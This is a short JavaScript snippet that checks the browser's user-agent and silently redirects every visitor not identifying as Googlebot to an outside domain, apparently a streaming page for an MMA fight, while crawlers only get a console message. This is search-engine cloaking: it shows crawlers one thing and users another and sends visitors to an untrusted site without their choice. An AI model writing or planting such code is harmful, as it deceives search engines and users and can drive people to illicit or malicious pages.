// Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
if (!navigator.userAgent.includes('Googlebot')) {
  // Redirect only normal users
  window.location.href = "https://sdhsaatv.pro/mma/?m=KSW%20121:%20Voj%C4%8D%C3%A1k%20vs%20W%C3%B3jcik";
} else {
  // For search engine crawlers, you can choose to perform a different action or not redirect
  console.log("THanks for visiting my page");
}
